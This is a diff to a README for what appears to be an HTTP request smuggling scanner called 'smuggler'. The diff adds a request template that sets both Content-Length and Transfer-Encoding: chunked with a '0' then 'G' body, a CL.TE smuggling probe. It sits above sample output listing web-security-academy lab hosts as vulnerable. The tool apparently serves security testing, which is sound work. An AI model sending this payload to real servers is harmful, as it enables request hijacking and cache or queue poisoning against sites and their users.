@@ -9,6 +9,21 @@ https://ac761f071e92b6b8c0448fee001c0096.web-security-academy.net/ is vulnerable
 https://acb71f6e1f079d25c08104be00290033.web-security-academy.net/ is vulnerable
 ```
 
+Templates:
+```
+POST {{.Path}} HTTP/1.1
+Host: {{.Host}}
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+```
+
 Usage:
 ```
 $ ./smuggler -h
